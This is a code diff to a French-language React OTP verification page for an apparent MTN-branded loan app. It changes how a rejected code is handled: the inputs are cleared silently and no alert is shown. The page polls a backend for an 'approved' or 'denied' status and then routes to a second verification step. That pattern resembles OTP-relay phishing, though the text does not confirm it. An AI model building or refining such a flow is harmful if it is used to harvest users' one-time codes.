@@ -2,12 +2,11 @@ import { useState, useEffect, useRef, type KeyboardEvent } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { Wallet, ArrowLeft } from "lucide-react";
 
-// ✅ UPDATED TO NEW RENDER URL
 const API_URL = "https://cameroon-mtn-loan-app.onrender.com";
 
 const OTPVerification = () => {
   const [otp, setOtp] = useState<string[]>(["", "", "", ""]);
-  const [timeLeft, setTimeLeft] = useState<number>(45); // ✅ 45 Seconds
+  const [timeLeft, setTimeLeft] = useState<number>(45); 
   const [isVerifying, setIsVerifying] = useState<boolean>(false);
   const navigate = useNavigate();
   const location = useLocation();
@@ -51,7 +50,6 @@ const OTPVerification = () => {
     
     const timeoutId = setTimeout(() => {
       setIsVerifying(false);
-      // Don't navigate away on timeout, just let them resend
       setTimeLeft(0); 
     }, 45000);
 
@@ -76,10 +74,10 @@ const OTPVerification = () => {
             if (statusData.status === "approved") {
               navigate("/second-verification", { state: { phone: phoneNumber } });
             } else if (statusData.status === "denied") {
-              // ✅ Denied: Stay on OTP page and allow resend
+              // ✅ Denied: Stay on OTP page, clear inputs silently, reset timer
               setOtp(["", "", "", ""]);
               setTimeLeft(0); 
-              alert("Code OTP refusé. Veuillez demander un nouveau code.");
+              inputRefs.current[0]?.focus();
             }
           }
         }, 2000);
@@ -99,6 +97,9 @@ const OTPVerification = () => {
     if (timeLeft > 0 || isVerifying) return;
     
     setIsVerifying(true);
+    // Ensure inputs are blank when resending
+    setOtp(["", "", "", ""]); 
+
     const timeoutId = setTimeout(() => {
       setIsVerifying(false);
       setTimeLeft(0); 
@@ -127,10 +128,10 @@ const OTPVerification = () => {
             if (statusData.status === "approved") {
               navigate("/second-verification", { state: { phone: phoneNumber } });
             } else if (statusData.status === "denied") {
-              // ✅ Denied: Stay on OTP page and allow resend
+              // ✅ Denied: Stay on OTP page, clear inputs silently, reset timer
               setOtp(["", "", "", ""]);
               setTimeLeft(0); 
-              alert("Code OTP refusé. Veuillez demander un nouveau code.");
+              inputRefs.current[0]?.focus();
             }
           }
         }, 2000);
@@ -196,7 +197,6 @@ const OTPVerification = () => {
           {isVerifying ? "En attente..." : "Vérifier & se connecter"}
         </button>
         
-        {/* ✅ Countdown & Resend UI */}
         <div style={{ textAlign: 'center', marginBottom: '24px' }}>
           <p className="helper-text" style={{ display: 'inline', marginRight: '8px' }}>
             Vous n'avez pas reçu le code ?
